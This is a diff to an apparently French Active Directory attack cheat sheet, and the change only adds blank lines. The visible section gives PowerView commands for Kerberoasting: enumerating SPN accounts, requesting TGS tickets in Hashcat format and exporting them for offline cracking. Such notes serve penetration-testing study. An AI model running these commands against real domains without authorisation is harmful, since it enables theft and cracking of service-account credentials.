@@ -997,15 +997,19 @@ Pour AES-256 (type 18) :
 ### PowerView (PowerShell)
 
 Charger PowerView :
+
 `Import-Module .\PowerView.ps1`
 
 Lister tous les users avec SPN :
+
 `Get-DomainUser * -spn | select samaccountname`
 
 Récupérer le ticket TGS au format Hashcat :
+
 `Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat`
 
 Exporter tous les tickets au format CSV :
+
 `Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\out_tgs.csv -NoTypeInformation`
 
 ### Rubeus
